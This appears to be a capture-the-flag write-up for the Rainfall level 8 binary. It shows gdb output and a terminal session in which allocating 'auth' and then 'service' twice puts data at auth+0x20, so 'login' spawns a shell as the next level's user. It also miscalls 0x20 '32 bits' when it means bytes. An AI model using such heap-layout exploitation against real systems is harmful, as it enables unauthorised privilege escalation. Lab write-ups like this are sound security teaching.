# Rainfall - Level 8

## Executable Analyse

```assembly
(gdb) info var
[...]
0x08049aac  auth
0x08049ab0  service
```


The program takes several input commands

- The `auth ` command is used to malloc the auth variable
- The `service` command is used to malloc the service variable
- The `login` command can open a shell and finish the exercise if `auth + 0x20` is not null

What we have to do to login is to produce a statement where  `service` address is allocated at least 0x20 (32 bits) further than `auth `.  

Note that malloc allocated 16bytes ranges each time `service` is called. So to get auth+32. We need to allocate 2 times service after allocate `auth `  .

```bash
$> ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ whoami
level9
```